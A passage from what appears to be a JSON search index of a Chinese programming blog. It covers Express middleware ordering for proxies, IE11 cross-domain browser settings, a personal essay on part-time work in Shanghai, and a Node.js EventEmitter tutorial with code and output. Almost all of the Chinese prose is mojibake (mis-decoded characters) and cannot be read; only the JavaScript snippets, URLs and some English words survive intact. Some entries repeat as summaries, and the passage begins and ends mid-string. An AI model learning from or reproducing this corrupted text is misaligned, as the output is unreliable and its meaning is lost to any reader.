¼å¼æ˜¯jsonçš„è¯·æ±‚ä½“éƒ½ä¼šè¢«è§£æã€‚\nä½†æ˜¯æœ‰äº›èµ°ä»£ç†çš„è¯·æ±‚ï¼Œå¦‚æœæˆ‘ä»¬å¹¶ä¸å…³å¿ƒè¯·æ±‚ä½“çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Œå®é™…ä¸Šæˆ‘ä»¬å¯ä»¥ä¸è§£æé‚£äº›èµ°ä»£ç†çš„è¯·æ±‚ã€‚æ‰€ä»¥ï¼Œå¯ä»¥å…ˆæŒ‚è½½ä»£ç†ä¸­é—´ä»¶ï¼Œç„¶åæŒ‚è½½è¯·æ±‚ä½“è§£æä¸­é—´ä»¶ï¼Œæœ€åæŒ‚è½½å†…éƒ¨çš„ä¸€äº›æ¥å£æœåŠ¡ã€‚\n// æ–¹æ¡ˆ1 bad app.use(express.json()) Object.keys(proxyTable).forEach(function (context) { app.use(proxyMiddleware(context, proxyTable[context])) }) app.use(\u0026#39;/api\u0026#39;, (req, res, next)=\u0026gt; { }) // æ–¹æ¡ˆ2 good Object.keys(proxyTable).forEach(function (context) { app.use(proxyMiddleware(context, proxyTable[context])) }) app.use(express.json()) app.use(\u0026#39;/api\u0026#39;, (req, res, next)=\u0026gt; { }) æ€»ç»“ ç»è¿‡è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘å¯¹Expressä¸­é—´ä»¶çš„æŒ‚è½½é¡ºåºæœ‰äº†æ›´åŠ æ·±åˆ»çš„è®¤è¯†ã€‚\nåŒæ—¶ï¼Œåœ¨ä½¿ç”¨ç¬¬ä¸‰æ–¹åŒ…çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœè¯¥åŒ…bugï¼Œé‚£ä¹ˆä¹Ÿéœ€è¦è‡ªè¡Œæ‰¾å‡ºåˆé€‚çš„è§£å†³æ–¹æ¡ˆã€‚è€Œè¿™ä¸ªèƒ½åŠ›ï¼Œå¾€å¾€å°±æ˜¯é«˜æ‰‹ä¸æ–°æ‰‹çš„åŒºåˆ«ã€‚","title":"Expressä»£ç†ä¸­é—´ä»¶é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ"},{"content":"IE11æœ‰å®‰å…¨è®¾ç½®ä¸­æœ‰ä¸¤ä¸ªé€‰é¡¹ï¼Œ\nè·¨åŸŸæµè§ˆçª—å£å’Œæ¡†æ¶ é€šè¿‡åŸŸè®¿é—®æ•°æ®æº å¦‚æœä¸Šé¢ä¸¤ä¸ªé€‰é¡¹è¢«ç¦ç”¨ï¼Œé‚£ä¹ˆIE11ä¼šæ‹’ç»è·¨åŸŸè¯·æ±‚ã€‚å¦‚æœæƒ³è¦è·¨åŸŸæˆåŠŸï¼Œå¿…é¡»å°†ä¸Šé¢ä¸¤ä¸ªé€‰é¡¹è®¾ç½®ä¸ºå¯ç”¨ã€‚\nç¬¬ä¸€æ­¥ æ‰“å¼€IE11 ç‚¹å‡»æµè§ˆå™¨å³ä¸Šè§’çš„é½¿è½®å›¾æ ‡ ç‚¹å‡»å¼¹æ¡†ä¸Šçš„ Interneté€‰é¡¹ ç¬¬äºŒæ­¥ ç‚¹å‡»å®‰å…¨ ç‚¹å‡»Internet ç‚¹å‡»è‡ªå®šä¹‰çº§åˆ« ç¬¬ä¸‰æ­¥ æ‰¾åˆ°è·¨åŸŸæµè§ˆçª—å£å’Œæ¡†æ¶\nå¦‚æœè¿™é¡¹æ˜¯ç¦ç”¨çš„ï¼Œé‚£ä¹ˆè¦å‹¾é€‰å¯ç”¨ã€‚\næ‰¾åˆ°é€šè¿‡åŸŸè®¿é—®æ•°æ®æº\nå¦‚æœè¿™é¡¹æ˜¯ç¦ç”¨çš„ï¼Œé‚£ä¹ˆè¦å‹¾é€‰å¯ç”¨ã€‚\næœ€ååœ¨ç‚¹å‡»ç¡®å®šã€‚\næœ€åï¼Œå¦‚æœè·¨åŸŸæµè§ˆçª—å£å’Œæ¡†æ¶,é€šè¿‡åŸŸè®¿é—®æ•°æ®æºéƒ½å¯ç”¨äº†ï¼Œè¿˜æ˜¯æ— æ³•è·¨åŸŸã€‚é‚£ä¹ˆæœ€å¥½é‡å¯ä¸€ä¸‹ç”µè„‘ã€‚æœ‰äº›è®¾ç½®å¯èƒ½åœ¨é‡å¯åæ‰ä¼šç”Ÿæ•ˆã€‚\n","permalink":"https://wdd.js.org/posts/2018/08/ie-cross-domain-settings/","summary":"IE11æœ‰å®‰å…¨è®¾ç½®ä¸­æœ‰ä¸¤ä¸ªé€‰é¡¹ï¼Œ\nè·¨åŸŸæµè§ˆçª—å£å’Œæ¡†æ¶ é€šè¿‡åŸŸè®¿é—®æ•°æ®æº å¦‚æœä¸Šé¢ä¸¤ä¸ªé€‰é¡¹è¢«ç¦ç”¨ï¼Œé‚£ä¹ˆIE11ä¼šæ‹’ç»è·¨åŸŸè¯·æ±‚ã€‚å¦‚æœæƒ³è¦è·¨åŸŸæˆåŠŸï¼Œå¿…é¡»å°†ä¸Šé¢ä¸¤ä¸ªé€‰é¡¹è®¾ç½®ä¸ºå¯ç”¨ã€‚\nç¬¬ä¸€æ­¥ æ‰“å¼€IE11 ç‚¹å‡»æµè§ˆå™¨å³ä¸Šè§’çš„é½¿è½®å›¾æ ‡ ç‚¹å‡»å¼¹æ¡†ä¸Šçš„ Interneté€‰é¡¹ ç¬¬äºŒæ­¥ ç‚¹å‡»å®‰å…¨ ç‚¹å‡»Internet ç‚¹å‡»è‡ªå®šä¹‰çº§åˆ« ç¬¬ä¸‰æ­¥ æ‰¾åˆ°è·¨åŸŸæµè§ˆçª—å£å’Œæ¡†æ¶\nå¦‚æœè¿™é¡¹æ˜¯ç¦ç”¨çš„ï¼Œé‚£ä¹ˆè¦å‹¾é€‰å¯ç”¨ã€‚\næ‰¾åˆ°é€šè¿‡åŸŸè®¿é—®æ•°æ®æº\nå¦‚æœè¿™é¡¹æ˜¯ç¦ç”¨çš„ï¼Œé‚£ä¹ˆè¦å‹¾é€‰å¯ç”¨ã€‚\næœ€ååœ¨ç‚¹å‡»ç¡®å®šã€‚\næœ€åï¼Œå¦‚æœè·¨åŸŸæµè§ˆçª—å£å’Œæ¡†æ¶,é€šè¿‡åŸŸè®¿é—®æ•°æ®æºéƒ½å¯ç”¨äº†ï¼Œè¿˜æ˜¯æ— æ³•è·¨åŸŸã€‚é‚£ä¹ˆæœ€å¥½é‡å¯ä¸€ä¸‹ç”µè„‘ã€‚æœ‰äº›è®¾ç½®å¯èƒ½åœ¨é‡å¯åæ‰ä¼šç”Ÿæ•ˆã€‚","title":"IE11è·¨åŸŸæ£€æŸ¥è·¨åŸŸè®¾ç½®"},{"content":" å¤§ä¸‰é‚£å¹´çš„æš‘å‡ å¤§ä¸‰é‚£å¹´æš‘å‡ï¼Œå¾ˆå¤šåŒå­¦éƒ½å›å»äº†ï¼Œå¯å®¤å¤§æ¥¼ç©ºç©ºå¦‚ä¹Ÿã€‚\nç•™åœ¨ä¸Šæµ·çš„åŒå­¦éƒ½åœ¨å„è‡ªæ‰¾ç€å…¼èŒçš„å·¥ä½œï¼Œä¸ºäº†ä¸æ˜¾å¾—æ— èŠï¼Œæˆ‘ä¹Ÿåœ¨ç½‘ä¸Šéšä¾¿å‘äº†ä¸€äº›ç®€å†ï¼Œè¯•è¯•çœ‹è¿æ°”ã€‚\nå†™ç®€å†æœ€éš¾å†™çš„éƒ¨åˆ†å°±æ˜¯å†™ä½ è‡ªå·±çš„é•¿å¤„æ˜¯ä»€ä¹ˆï¼Ÿæœç´¢æ¯è‚ ï¼Œè§‰å¾—è‡ªå·±ä¼¼ä¹ä¹Ÿæ²¡ä»€ç‰¹é•¿ã€‚æ„Ÿè§‰å¤§å­¦ä¸‰å¹´å­¦åˆ°ä¸€äº›ä¸œè¥¿ï¼Œåˆæ„Ÿè§‰ä»€ä¹ˆéƒ½æ²¡å­¦åˆ°ã€‚\nå¦‚æœæ²¡æœ‰ç‰¹é•¿ï¼Œæ€»è¯¥ä¹Ÿæœ‰ç‚¹ç†æƒ³å§ï¼Œæ¯”å¦‚æƒ³å¹²ç‚¹ä»€ä¹ˆï¼Ÿ ä¼¼ä¹æˆ‘ä¹Ÿæ²¡ä»€ä¹ˆæƒ³åšçš„äº‹æƒ…ã€‚\nå°æ—¶å€™æˆ‘ä»¬éƒ½æœ‰ç†æƒ³ï¼Œæ…¢æ…¢é•¿å¤§åï¼Œç†æƒ³è¶Šæ¥è¶Šæ¨¡ç³Šï¼Œå˜å¾—è¶Šæ¥è¶Šè¿·èŒ«ã€‚\nå¤§å­¦é‡Œï¼Œå¤§éƒ¨åˆ†çš„äººéƒ½æ˜¯åœ¨æ‰“æ¸¸æˆã€‚æˆ‘ä¹Ÿæ›¾è¿·æ‹è¿‡æ‰“æ¸¸æˆï¼Œä½†æ˜¯å› ä¸ºè‡ªå·±æ¯”è¾ƒèœï¼Œæ€»æ˜¯è¢«è™ï¼Œæ‰€ä»¥æ”¾å¼ƒäº†ã€‚\nä½†æ˜¯æˆ‘ä¹Ÿä¸æ˜¯é‚£ç§å¤©å¤©å¯¹ç€ç¬”è®°æœ¬çœ‹ç”µè§†å‰§çš„äººã€‚\nå›å¿†åˆä¸‰é‚£å¹´çš„æš‘å‡ è®°å¾—ï¼Œåˆä¸‰çš„æš‘å‡ï¼Œæˆ‘å‚åŠ äº†ä¸€ä¸ªå­¦æ ¡çœ‹å±•çš„ä¸€ä¸ªå…è´¹çš„è®¡ç®—æœºåŸ¹è®­ç­ã€‚å› ä¸ºåŸ¹è®­çš„è€å¸ˆè¯´ï¼ŒåŸ¹è®­ç»“æŸå‰ä¼šæœ‰ä¸€ä¸ªæµ‹è¯•ï¼Œæˆç»©æœ€å¥½çš„ä¼šæœ‰å‡ ç™¾å—çš„å¥–åŠ±ã€‚\nä¸ºäº†å‡ ç™¾å—çš„å¥–åŠ±ï¼Œæˆ‘ç¬¬ä¸€ä¸ªèƒŒè¯µå®Œäº”ç¬”æ‹†å­—æ³•ã€‚éšåè€å¸ˆæ•™äº†æˆ‘ä»¬PS, å°±æ˜¯photoshopã€‚å½“æ—¶æˆ‘çš„ç†è§£å°±æ˜¯ï¼Œpså¯ä»¥åšå‡ºå¾ˆå¤šæç¬‘çš„å›¾ç‰‡ã€‚\nä¸ºäº†æˆä¸ºä¸€ä¸ªæœ‰èƒ½åŠ›åšå‡ºæç¬‘å›¾ç‰‡çš„äººã€‚æˆ‘åœ¨é«˜ä¸­å’Œå¤§å­¦æœŸé—´ï¼Œæ–­æ–­ç»­ç»­çš„ç³»ç»Ÿçš„è‡ªå­¦äº†PSã€‚\nä¸‹é¢ç»™å±•ç¤ºå‡ å¼ æˆ‘çš„PSç…§ç‰‡\nã€æ¯•ä¸šç…§ã€‘\nã€å¸®åˆ«äººåšçš„è‰ºæœ¯ç…§ã€‘\nã€åˆºå®¢ä¿¡æ¡ æ¢è„¸ æˆ‘è‡ªå·±ã€‘\nã€æ—…æ¸¸ç…§ æ¢è„¸ æˆ‘è‡ªå·±ã€‘\nã€å®¿èˆæ¥¼ ä¸Šé¢psäº†ä¸€æ¡ç‹¼ã€‘\nå¤ç©è‰ºæœ¯ç”µå•†ä¸­çš„åº—å°äºŒ åŸºæœ¬ä¸Šï¼Œæˆ‘çš„PSæŠ€æœ¯è¿˜æ˜¯èƒ½å¤Ÿæ‰¾ç‚¹å…¼èŒåšçš„ã€‚æ²¡è¿‡å¤šä¹…ï¼Œæˆ‘æ”¶åˆ°äº†é¢è¯•é‚€è¯·ï¼Œé¢è¯•çš„å…¬å¸ä½äºä¸€ä¸ªå¤ç©æ”¶è—å“å¸‚åœºä¸­ã€‚\nå½“ç„¶æˆ‘é¢è¯•æˆåŠŸäº†ï¼Œå¼€å‡ºçš„æ—¥è–ªä¹Ÿæ˜¯éå¸¸è¯±äººï¼Œæ¯å¤©35å…ƒã€‚\nåœ¨ä¸Šæµ·ï¼Œ35å…ƒä¸€å¤©çš„å·¥èµ„ï¼Œé™¤å»æ¥å›ä¸Šä¸‹ç­åšåœ°é“å’Œå…¬äº¤ï¼Œè¿˜æœ‰ä¸­åˆé¥­çš„è´¹ç”¨å¤–ï¼ŒåŸºæœ¬ä¸Šä¸ä¼šå‰©ä¸‹ä»€ä¹ˆï¼Œæœ‰æ—¶å€™ç¨å¾®åˆé¥­ä¸°ç››ç‚¹ï¼Œè‡ªå·±å°±è¦å€’è´´ã€‚ä½†æ˜¯è¿™ä¹Ÿæ˜¯ä¸€æ¬¡ä¸é”™çš„å°è¯•ï¼Œè‡³å°‘æœ‰å²ä»¥æ¥ï¼Œé™¤å»çˆ¶æ¯ä»¥å¤–ï¼Œæˆ‘ç”¨èƒ½åŠ›é—®åˆ«äººè¦é’±äº†ã€‚\n35å…ƒçš„æ—¥è–ªæŒç»­å¾ˆçŸ­ä¸€æ®µæ—¶é—´ï¼Œç„¶åæˆ‘å°±æ¶¨è–ªäº†ï¼Œåˆ°è¾¾æ¯å¤©100å…ƒã€‚åœ¨è¿™ä¸ªåšå…¼èŒçš„åœ°æ–¹ï¼Œæˆ‘æœ€é«˜æ‹¿åˆ°çš„æ—¥è–ªæ˜¯200å…ƒã€‚\nå…¼èŒæœŸé—´æˆ‘åšäº†å„å¼å„æ ·çš„å·¥ä½œï¼š\nå¤ç©è‰ºæœ¯å“æ‘„å½± æµ·æŠ¥åˆ¶ä½œ æ‹å–å›¾å†Œåˆ¶ä½œ linuxè¿ç»´ APP UI è®¾è®¡ ç½‘é¡µè®¾è®¡ pythonçˆ¬è™« å…¼èŒçš„æ—¥å¿—è¿‡å¾—å¾ˆè‹¦ï¼Œå•æ˜¯è¿˜ç®—å……å®ã€‚è™½ç„¶å·¥èµ„ä¸é«˜ï¼Œä½†æ˜¯å› ä¸ºè¿˜æ²¡æ¯•ä¸šï¼Œä¹Ÿæ²¡æœ‰å¥¢æœ›è¿‡é«˜çš„å·¥èµ„ã€‚\nã€ä¸Šå›¾ æˆ‘åœ¨ä¸€ä¸ªå¤ç©åº—çš„æ‹æ‘„ç‰å™¨çš„æ—¶å€™ï¼Œæœ‰ä¸ªå°å¥³å­©è¿‡æ¥æ‰¾æˆ‘ç©ï¼Œæˆ‘éšæ‰‹æ‹çš„ã€‘\nã€ä¸Šå›¾ æ˜¯åœ¨1å·çº¿ è²èŠ±è·¯åœ°é“ç«™ å› ä¸ºé”™è¿‡äº†åœ°é“æ‹çš„ã€‘\nã€ä¸Šå›¾ æ˜¯ä»1å·çº¿ è²èŠ±åœ°é“ç«™ è½¬å…¬äº¤æ‹çš„ã€‘\nã€æ¯å¤©æ—©ä¸Šèµ·çš„å¾ˆæ—©ï¼Œèƒ½å¤Ÿçœ‹åˆ°å†›è®­çš„å­¦ç”Ÿåœ¨æ“åœºä¸Šå¥”è·‘ã€‘\nã€åœ¨å¤ç©åº—ä¸€èˆ¬éƒ½è¦æ‹åˆ°å¾ˆæ™šï¼Œå› ä¸ºæ˜¯æŒ‰å¼ æ•°ç®—æ‹ç…§å·¥èµ„ï¼Œæ‹çš„è¶Šå¤šï¼Œå·¥èµ„è¶Šé«˜ã€‚è¿˜å¥½æ™šä¸Šå›å…¬å¸ æ‰“è½¦è´¹ç”¨æ˜¯å¯ä»¥æŠ¥é”€çš„ã€‘\nã€æ™šä¸Šè¿˜è¦å›åˆ°å­¦æ ¡ï¼Œä¸€èˆ¬åˆ°å­¦æ ¡å°±å¿«æ™šä¸Š10ç‚¹å·¦å³äº†ã€‘\nã€æ¯•ä¸šäº†ï¼Œæ–°æ ¡åŒºä¾ç„¶å¾ˆæ¼‚äº®ã€‘\nã€æ¯•ä¸šäº†ï¼Œè€æ ¡åŒºä¸‹äº†ä¸€åœºé›¨ã€‘\nã€æ¯•ä¸šäº†ï¼Œé’æ˜¥åƒä¸€è‰˜èˆ¹ï¼Œæ²‰å…¥æµ·åº•ã€‘\nã€æ¯•ä¸šäº†ï¼Œæˆ‘ç­‰çš„äººï¼Œä½ åœ¨å“ªé‡Œï¼Ÿã€‘\n","permalink":"https://wdd.js.org/posts/2018/08/the-rest-of-your-life/","summary":"å¤§ä¸‰é‚£å¹´çš„æš‘å‡ å¤§ä¸‰é‚£å¹´æš‘å‡ï¼Œå¾ˆå¤šåŒå­¦éƒ½å›å»äº†ï¼Œå¯å®¤å¤§æ¥¼ç©ºç©ºå¦‚ä¹Ÿã€‚\nç•™åœ¨ä¸Šæµ·çš„åŒå­¦éƒ½åœ¨å„è‡ªæ‰¾ç€å…¼èŒçš„å·¥ä½œï¼Œä¸ºäº†ä¸æ˜¾å¾—æ— èŠï¼Œæˆ‘ä¹Ÿåœ¨ç½‘ä¸Šéšä¾¿å‘äº†ä¸€äº›ç®€å†ï¼Œè¯•è¯•çœ‹è¿æ°”ã€‚\nå†™ç®€å†æœ€éš¾å†™çš„éƒ¨åˆ†å°±æ˜¯å†™ä½ è‡ªå·±çš„é•¿å¤„æ˜¯ä»€ä¹ˆï¼Ÿæœç´¢æ¯è‚ ï¼Œè§‰å¾—è‡ªå·±ä¼¼ä¹ä¹Ÿæ²¡ä»€ç‰¹é•¿ã€‚æ„Ÿè§‰å¤§å­¦ä¸‰å¹´å­¦åˆ°ä¸€äº›ä¸œè¥¿ï¼Œåˆæ„Ÿè§‰ä»€ä¹ˆéƒ½æ²¡å­¦åˆ°ã€‚\nå¦‚æœæ²¡æœ‰ç‰¹é•¿ï¼Œæ€»è¯¥ä¹Ÿæœ‰ç‚¹ç†æƒ³å§ï¼Œæ¯”å¦‚æƒ³å¹²ç‚¹ä»€ä¹ˆï¼Ÿ ä¼¼ä¹æˆ‘ä¹Ÿæ²¡ä»€ä¹ˆæƒ³åšçš„äº‹æƒ…ã€‚\nå°æ—¶å€™æˆ‘ä»¬éƒ½æœ‰ç†æƒ³ï¼Œæ…¢æ…¢é•¿å¤§åï¼Œç†æƒ³è¶Šæ¥è¶Šæ¨¡ç³Šï¼Œå˜å¾—è¶Šæ¥è¶Šè¿·èŒ«ã€‚\nå¤§å­¦é‡Œï¼Œå¤§éƒ¨åˆ†çš„äººéƒ½æ˜¯åœ¨æ‰“æ¸¸æˆã€‚æˆ‘ä¹Ÿæ›¾è¿·æ‹è¿‡æ‰“æ¸¸æˆï¼Œä½†æ˜¯å› ä¸ºè‡ªå·±æ¯”è¾ƒèœï¼Œæ€»æ˜¯è¢«è™ï¼Œæ‰€ä»¥æ”¾å¼ƒäº†ã€‚\nä½†æ˜¯æˆ‘ä¹Ÿä¸æ˜¯é‚£ç§å¤©å¤©å¯¹ç€ç¬”è®°æœ¬çœ‹ç”µè§†å‰§çš„äººã€‚\nå›å¿†åˆä¸‰é‚£å¹´çš„æš‘å‡ è®°å¾—ï¼Œåˆä¸‰çš„æš‘å‡ï¼Œæˆ‘å‚åŠ äº†ä¸€ä¸ªå­¦æ ¡çœ‹å±•çš„ä¸€ä¸ªå…è´¹çš„è®¡ç®—æœºåŸ¹è®­ç­ã€‚å› ä¸ºåŸ¹è®­çš„è€å¸ˆè¯´ï¼ŒåŸ¹è®­ç»“æŸå‰ä¼šæœ‰ä¸€ä¸ªæµ‹è¯•ï¼Œæˆç»©æœ€å¥½çš„ä¼šæœ‰å‡ ç™¾å—çš„å¥–åŠ±ã€‚\nä¸ºäº†å‡ ç™¾å—çš„å¥–åŠ±ï¼Œæˆ‘ç¬¬ä¸€ä¸ªèƒŒè¯µå®Œäº”ç¬”æ‹†å­—æ³•ã€‚éšåè€å¸ˆæ•™äº†æˆ‘ä»¬PS, å°±æ˜¯photoshopã€‚å½“æ—¶æˆ‘çš„ç†è§£å°±æ˜¯ï¼Œpså¯ä»¥åšå‡ºå¾ˆå¤šæç¬‘çš„å›¾ç‰‡ã€‚\nä¸ºäº†æˆä¸ºä¸€ä¸ªæœ‰èƒ½åŠ›åšå‡ºæç¬‘å›¾ç‰‡çš„äººã€‚æˆ‘åœ¨é«˜ä¸­å’Œå¤§å­¦æœŸé—´ï¼Œæ–­æ–­ç»­ç»­çš„ç³»ç»Ÿçš„è‡ªå­¦äº†PSã€‚\nä¸‹é¢ç»™å±•ç¤ºå‡ å¼ æˆ‘çš„PSç…§ç‰‡\nã€æ¯•ä¸šç…§ã€‘\nã€å¸®åˆ«äººåšçš„è‰ºæœ¯ç…§ã€‘\nã€åˆºå®¢ä¿¡æ¡ æ¢è„¸ æˆ‘è‡ªå·±ã€‘\nã€æ—…æ¸¸ç…§ æ¢è„¸ æˆ‘è‡ªå·±ã€‘\nã€å®¿èˆæ¥¼ ä¸Šé¢psäº†ä¸€æ¡ç‹¼ã€‘\nå¤ç©è‰ºæœ¯ç”µå•†ä¸­çš„åº—å°äºŒ åŸºæœ¬ä¸Šï¼Œæˆ‘çš„PSæŠ€æœ¯è¿˜æ˜¯èƒ½å¤Ÿæ‰¾ç‚¹å…¼èŒåšçš„ã€‚æ²¡è¿‡å¤šä¹…ï¼Œæˆ‘æ”¶åˆ°äº†é¢è¯•é‚€è¯·ï¼Œé¢è¯•çš„å…¬å¸ä½äºä¸€ä¸ªå¤ç©æ”¶è—å“å¸‚åœºä¸­ã€‚\nå½“ç„¶æˆ‘é¢è¯•æˆåŠŸäº†ï¼Œå¼€å‡ºçš„æ—¥è–ªä¹Ÿæ˜¯éå¸¸è¯±äººï¼Œæ¯å¤©35å…ƒã€‚\nåœ¨ä¸Šæµ·ï¼Œ35å…ƒä¸€å¤©çš„å·¥èµ„ï¼Œé™¤å»æ¥å›ä¸Šä¸‹ç­åšåœ°é“å’Œå…¬äº¤ï¼Œè¿˜æœ‰ä¸­åˆé¥­çš„è´¹ç”¨å¤–ï¼ŒåŸºæœ¬ä¸Šä¸ä¼šå‰©ä¸‹ä»€ä¹ˆï¼Œæœ‰æ—¶å€™ç¨å¾®åˆé¥­ä¸°ç››ç‚¹ï¼Œè‡ªå·±å°±è¦å€’è´´ã€‚ä½†æ˜¯è¿™ä¹Ÿæ˜¯ä¸€æ¬¡ä¸é”™çš„å°è¯•ï¼Œè‡³å°‘æœ‰å²ä»¥æ¥ï¼Œé™¤å»çˆ¶æ¯ä»¥å¤–ï¼Œæˆ‘ç”¨èƒ½åŠ›é—®åˆ«äººè¦é’±äº†ã€‚\n35å…ƒçš„æ—¥è–ªæŒç»­å¾ˆçŸ­ä¸€æ®µæ—¶é—´ï¼Œç„¶åæˆ‘å°±æ¶¨è–ªäº†ï¼Œåˆ°è¾¾æ¯å¤©100å…ƒã€‚åœ¨è¿™ä¸ªåšå…¼èŒçš„åœ°æ–¹ï¼Œæˆ‘æœ€é«˜æ‹¿åˆ°çš„æ—¥è–ªæ˜¯200å…ƒã€‚\nå…¼èŒæœŸé—´æˆ‘åšäº†å„å¼å„æ ·çš„å·¥ä½œï¼š\nå¤ç©è‰ºæœ¯å“æ‘„å½± æµ·æŠ¥åˆ¶ä½œ æ‹å–å›¾å†Œåˆ¶ä½œ linuxè¿ç»´ APP UI è®¾è®¡ ç½‘é¡µè®¾è®¡ pythonçˆ¬è™« å…¼èŒçš„æ—¥å¿—è¿‡å¾—å¾ˆè‹¦ï¼Œå•æ˜¯è¿˜ç®—å……å®ã€‚è™½ç„¶å·¥èµ„ä¸é«˜ï¼Œä½†æ˜¯å› ä¸ºè¿˜æ²¡æ¯•ä¸šï¼Œä¹Ÿæ²¡æœ‰å¥¢æœ›è¿‡é«˜çš„å·¥èµ„ã€‚\nã€ä¸Šå›¾ æˆ‘åœ¨ä¸€ä¸ªå¤ç©åº—çš„æ‹æ‘„ç‰å™¨çš„æ—¶å€™ï¼Œæœ‰ä¸ªå°å¥³å­©è¿‡æ¥æ‰¾æˆ‘ç©ï¼Œæˆ‘éšæ‰‹æ‹çš„ã€‘\nã€ä¸Šå›¾ æ˜¯åœ¨1å·çº¿ è²èŠ±è·¯åœ°é“ç«™ å› ä¸ºé”™è¿‡äº†åœ°é“æ‹çš„ã€‘\nã€ä¸Šå›¾ æ˜¯ä»1å·çº¿ è²èŠ±åœ°é“ç«™ è½¬å…¬äº¤æ‹çš„ã€‘\nã€æ¯å¤©æ—©ä¸Šèµ·çš„å¾ˆæ—©ï¼Œèƒ½å¤Ÿçœ‹åˆ°å†›è®­çš„å­¦ç”Ÿåœ¨æ“åœºä¸Šå¥”è·‘ã€‘\nã€åœ¨å¤ç©åº—ä¸€èˆ¬éƒ½è¦æ‹åˆ°å¾ˆæ™šï¼Œå› ä¸ºæ˜¯æŒ‰å¼ æ•°ç®—æ‹ç…§å·¥èµ„ï¼Œæ‹çš„è¶Šå¤šï¼Œå·¥èµ„è¶Šé«˜ã€‚è¿˜å¥½æ™šä¸Šå›å…¬å¸ æ‰“è½¦è´¹ç”¨æ˜¯å¯ä»¥æŠ¥é”€çš„ã€‘\nã€æ™šä¸Šè¿˜è¦å›åˆ°å­¦æ ¡ï¼Œä¸€èˆ¬åˆ°å­¦æ ¡å°±å¿«æ™šä¸Š10ç‚¹å·¦å³äº†ã€‘\nã€æ¯•ä¸šäº†ï¼Œæ–°æ ¡åŒºä¾ç„¶å¾ˆæ¼‚äº®ã€‘\nã€æ¯•ä¸šäº†ï¼Œè€æ ¡åŒºä¸‹äº†ä¸€åœºé›¨ã€‘\nã€æ¯•ä¸šäº†ï¼Œé’æ˜¥åƒä¸€è‰˜èˆ¹ï¼Œæ²‰å…¥æµ·åº•ã€‘\nã€æ¯•ä¸šäº†ï¼Œæˆ‘ç­‰çš„äººï¼Œä½ åœ¨å“ªé‡Œï¼Ÿã€‘","title":"æ¯•ä¸šåï¼Œé’æ˜¥åƒä¸€è‰˜èˆ¹ï¼Œæ²‰å…¥æµ·åº•"},{"content":"1. ç¯å¢ƒ node 8.11.3 2. åŸºæœ¬ä½¿ç”¨ // 01.js const EventEmitter = require(\u0026#39;events\u0026#39;); class MyEmitter extends EventEmitter {} const myEmitter = new MyEmitter(); myEmitter.on(\u0026#39;event\u0026#39;, () =\u0026gt; { console.log(\u0026#39;an event occurred!\u0026#39;); }); myEmitter.emit(\u0026#39;event\u0026#39;); è¾“å‡ºï¼š\nan event occurred! 3. ä¼ å‚ä¸thisæŒ‡å‘ emit()æ–¹æ³•å¯ä»¥ä¼ ä¸é™åˆ¶æ•°é‡çš„å‚æ•°ã€‚ é™¤äº†ç®­å¤´å‡½æ•°å¤–ï¼Œåœ¨å›è°ƒå‡½æ•°å†…éƒ¨ï¼Œthisä¼šè¢«ç»‘å®šåˆ°EventEmitterç±»çš„å®ä¾‹ä¸Š // 02.js const EventEmitter = require(\u0026#39;events\u0026#39;) class MyEmitter extends EventEmitter {} const myEmitter = new MyEmitter() myEmitter.on(\u0026#39;event\u0026#39;, function (a, b){ console.log(a, b, this, this === myEmitter) }) myEmitter.on(\u0026#39;event\u0026#39;, (a, b) =\u0026gt; { console.log(a, b, this, this === myEmitter) }) myEmitter.emit(\u0026#39;event\u0026#39;, \u0026#39;a\u0026#39;, {name:\u0026#39;wdd\u0026#39;}) è¾“å‡ºï¼š\na { name: \u0026#39;wdd\u0026#39; } MyEmitter { domain: null, _events: { event: [ [Function], [Function] ] }, _eventsCount: 1, _maxListeners: undefined } true a { name: \u0026#39;wdd\u0026#39; } {} false 4. åŒæ­¥è¿˜æ˜¯å¼‚æ­¥è°ƒç”¨listeners? emit()æ³•ä¼šåŒæ­¥æŒ‰ç…§äº‹ä»¶æ³¨å†Œçš„é¡ºåºæ‰§è¡Œå›è°ƒ // 03.js const EventEmitter = require(\u0026#39;events\u0026#39;) class MyEmitter extends EventEmitter {} const myEmitter = new MyEmitter() myEmitter.on(\u0026#39;event\u0026#39;, () =\u0026gt; { console.log(\u0026#39;01 an event occurred!\u0026#39;) }) myEmitter.on(\u0026#39;event\u0026#39;, () =\u0026gt; { console.log(\u0026#39;02 an event occurred!\u0026#39;) }) console.log(1) myEmitter.emit(\u0026#39;event\u0026#39;) console.log(2) è¾“å‡ºï¼š\n1 01 an event occurred! 02 an event occurred! 2 æ·±å…¥æ€è€ƒï¼Œä¸ºä»€ä¹ˆäº‹ä»¶å›è°ƒè¦åŒæ­¥ï¼Ÿå¼‚æ­¥äº†ä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Ÿ\nåŒæ­¥å»è°ƒç”¨äº‹ä»¶ç›‘å¬è€…ï¼Œèƒ½å¤Ÿç¡®ä¿æŒ‰ç…§æ³¨å†Œé¡ºåºå»è°ƒç”¨äº‹ä»¶ç›‘å¬è€…ï¼Œå¹¶ä¸”é¿å…ç«æ€æ¡ä»¶å’Œé€»è¾‘é”™è¯¯ã€‚\n5. å¦‚ä½•åªè®¢é˜…ä¸€æ¬¡äº‹ä»¶ï¼Ÿ ä½¿ç”¨onceå»åªè®¢é˜…ä¸€æ¬¡äº‹ä»¶ // 04.js const EventEmitter = require(\u0026#39;events\u0026#39;) class MyEmitter extends EventEmitter {} const myEmitter = new MyEmitter() let m = 0 myEmitter.once(\u0026#39;event\u0026#39;, () =\u0026gt; { console.log(++m) }) myEmitter.emit(\u0026#39;event\u0026#39;) myEmitter.emit(\u0026#39;event\u0026#39;) 6. ä¸è®¢é˜…ï¼Œå°±å‘é£™çš„é”™è¯¯äº‹ä»¶ erroræ˜¯ä¸€ä¸ªç‰¹åˆ«çš„äº‹ä»¶åï¼Œå½“è¿™ä¸ªäº‹ä»¶è¢«è§¦å‘æ—¶ï¼Œå¦‚æœæ²¡æœ‰å¯¹åº”çš„äº‹ä»¶ç›‘å¬è€…ï¼Œåˆ™ä¼šå¯¼è‡´ç¨‹åºå´©æºƒã€‚\nevents.js:183 throw er; // Unhandled \u0026#39;error\u0026#39; event ^ Error: test at Object.\u0026lt;anonymous\u0026gt; (/Users/xxx/github/node-note/events/05.js:12:25) at Module._compile (module.js:635:30) at Object.Module._extensions..js (module.js:646:10) at Module.load (module.js:554:32) at tryModuleLoad 